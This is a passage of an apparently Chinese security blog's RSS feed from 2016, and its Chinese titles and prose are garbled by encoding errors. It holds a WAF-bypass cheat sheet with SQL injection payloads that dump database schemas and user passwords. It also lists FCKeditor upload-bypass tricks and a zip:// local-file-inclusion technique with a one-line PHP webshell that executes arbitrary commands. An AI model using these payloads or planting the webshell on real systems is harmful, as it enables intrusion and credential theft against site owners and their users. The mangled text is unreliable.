http://mp.weixin.qq.com/s?__biz=MzIyNjQzMjcyNw==&amp;amp;mid=2247483860&amp;amp;idx=1&amp;amp;sn=fa19f02e29d25f5f6852af27451ae4a9&amp;amp;scene=23&amp;amp;srcid=0815JYA53l0Bk3PMkhzRlKUh#rd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-bypassed&quot;&gt;0x01 bypassed&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;modsecurity
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.schemata*/--
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(column_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.columns where table_name=0x75736572*/--
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user*/--
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 12 Aug 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</link>
        <guid isPermaLink="true">/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</guid>
        
        <category>waf</category>
        
        <category>bypass</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>fckeditorå„ç‰ˆæœ¬ç»•è¿‡</title>
        <description>&lt;h3 id=&quot;x00-fckeditor&quot;&gt;0x00 fckeditorä¸Šä¼ æ¼æ´æ€»ç»“&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://sec.chinabyte.com/206/13708206.shtml
http://www.cnbraid.com/2015/07/09/fckeditor/
http://www.it610.com/article/1842939.htm
http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf &amp;lt;=2.6.4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-asp&quot;&gt;0x01 asp&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;=2.6.4
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
2.6.6
    http://www.hack80.com/thread-320-1-1.html
    http://www.qhwins.com/ShowNews/?11-20109214030542523.html
2.6.8
    http://www.freebuf.com/vuls/6408.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-php&quot;&gt;0x02 php&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;=2.6.4
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-fckeditor&quot;&gt;0x03 fckeditorç»å…¸å°è¯•åç¼€&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;å°†åç¼€æ”¹æˆ.php.pjpg
2&amp;gt;å°†åç¼€æ”¹æˆ.html
3&amp;gt;å°†åç¼€æ”¹æˆ.lnk
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-&quot;&gt;0x04 å…¶å®ƒä¸Šä¼ æŠ€å·§&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;ä¸Šä¼ æ—¶,å»¶è¿Ÿä¸€ä¸‹å†ä¸Šä¼ ,æœ‰æ—¶èƒ½bypass admin,ç”¨åˆ°firefox tamperæ’ä»¶
    https://www.youtube.com/watch?v=ndeYnMoFPx8
    ç®¡ç†å‘˜ç™»å½•ç»•è¿‡
        https://www.youtube.com/watch?v=UO-vzWFctTA
        https://www.youtube.com/watch?v=a5fm629s8Ao
            firefox noredirectæ’ä»¶
2&amp;gt;åŒæ–‡ä»¶ä¸Šä¼ 
3&amp;gt;ä¸Šä¼ ä»¥å›¾ç‰‡åç¼€åä¸ºåç¼€çš„å‹ç¼©æ–‡ä»¶,æ–‡ä»¶å®é™…æ˜¯ä¸€ä¸ªwebshell.phpæ–‡ä»¶çš„å‹ç¼©æ–‡ä»¶(zip),åˆ©ç”¨lfiæ¼æ´å¹¶å°†lfiè¦åŒ…å«
  çš„æ–‡ä»¶çš„å‚æ•°èµ‹å€¼ä¸º:
    zip://archive.zip#webshell.php
    æˆ–
    zip://archive.zip#webshell.php&amp;amp;param1=system&amp;amp;param2=ls   ===&amp;gt;è¿™é‡Œå¯¹åº”webshell.phpä¸º:
        &amp;lt;?php $_GET[&#39;param1&#39;]($_GET[&#39;param2&#39;]);?&amp;gt;
  è¿™é‡Œé€‚ç”¨çš„æƒ…å†µä¸º:
    a&amp;gt;å¯ä¸Šä¼ ä»»æ„å†…å®¹æ–‡ä»¶(é€šè¿‡ä¿®æ”¹Content-Typeç­‰è¾¾åˆ°ç›®çš„),ä½†æ–‡ä»¶ä¼šè¢«é‡å‘½ä»¤ä¸ºä»¥pngä¸ºåç¼€æ–‡ä»¶
    b&amp;gt;æ‰¾åˆ°äº†lfiæ¼æ´,ä½†æ˜¯lfiæ¼æ´ä¸èƒ½åŒ…å‡½.|./|..|..\|...ç­‰æƒ…å†µ
  æ›´å¤šç»†èŠ‚:
    https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 12 Aug 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/08/12/fckeditor%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</link>
        <guid isPermaLink="true">/web/2016/08/12/fckeditor%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</guid>
        
        <category>fckeditor</category>
        
        <category>web</category>
        
        <category>upload</category>
        
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
